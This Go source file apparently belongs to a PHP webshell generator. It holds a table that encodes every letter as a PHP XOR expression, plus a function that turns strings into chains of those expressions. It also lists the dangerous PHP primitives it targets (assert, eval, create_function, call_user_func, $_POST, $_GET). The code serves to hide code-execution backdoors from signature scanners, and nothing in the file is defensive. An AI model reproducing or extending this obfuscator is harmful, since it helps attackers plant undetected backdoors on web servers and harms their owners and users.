package common

import "strings"

var(
	FuncWord=[]string{"@assert","@eval","create_function","@call_user_func","$_POST","$_GET"}
	XorExchange=map[string]string{
		"a":`("]" ^ "<")`,
		"b":`("]" ^ "?")`,
		"c":`("]" ^ ">")`,
		"d":`("]" ^ "9")`,
		"e":`("]" ^ "8")`,
		"f":`("]" ^ ";")`,
		"g":`("]" ^ ":")`,
		"h":`("]" ^ "5")`,
		"i":`("]" ^ "4")`,
		"j":`("]" ^ "7")`,
		"k":`("]" ^ "6")`,
		"l":`("]" ^ "1")`,
		"m":`("]" ^ "0")`,
		"n":`("]" ^ "3")`,
		"o":`("]" ^ "2")`,
		"p":`("]" ^ "-")`,
		"q":`("]" ^ ",")`,
		"r":`("]" ^ "/")`,
		"s":`("]" ^ ".")`,
		"t":`("]" ^ ")")`,
		"u":`("]" ^ "(")`,
		"v":`("]" ^ "+")`,
		"w":`("]" ^ "*")`,
		"x":`("%" ^ "]")`,
		"y":`("]" ^ "$")`,
		"z":`("]" ^ "'")`,
		"A":`("~" ^ "?")`,
		"B":`("~" ^ "<")`,
		"C":`("~" ^ "=")`,
		"D":`("~" ^ ":")`,
		"E":`("~" ^ ";")`,
		"F":`("~" ^ "8")`,
		"G":`("~" ^ "9")`,
		"H":`("~" ^ "6")`,
		"I":`("~" ^ "7")`,
		"J":`("~" ^ "4")`,
		"K":`("~" ^ "5")`,
		"L":`("~" ^ "2")`,
		"M":`("~" ^ "3")`,
		"N":`("~" ^ "0")`,
		"O":`("~" ^ "1")`,
		"P":`("~" ^ ".")`,
		"Q":`("~" ^ "/")`,
		"R":`("~" ^ ",")`,
		"S":`("~" ^ "-")`,
		"T":`("~" ^ "*")`,
		"U":`("~" ^ "+")`,
		"V":`("~" ^ "(")`,
		"W":`("~" ^ ")")`,
		"X":`("~" ^ "&")`,
		"Y":`("~" ^ "'")`,
		"Z":`("~" ^ "$")`}
)

func isLetter(a int32) bool {
	//65-90 97-122
	if (a>=65&&a<=90) || (a>=97&&a<=122){
		return true
	}else {
		return false
	}
}
func TransForm(stringSlice []string) []string {
	var result []string
	for _,oneString:=range stringSlice{
		symbol:=`"`
		oneResult:=``
		for _,c :=range oneString{
			if !isLetter(c){
				symbol+=string(c)
			}else {
				if len(symbol)==1{
					oneResult+=XorExchange[string(c)]+`.`
				}else {
					symbol+=`".`
					oneResult+=symbol+XorExchange[string(c)]+`.`
					symbol=`"`
				}
			}
		}
		if len(symbol)!=1{
			oneResult+=symbol+`"`
		}
		oneResult=strings.Trim(oneResult,`.`)
		result=append(result,oneResult)
	}
	return result
}
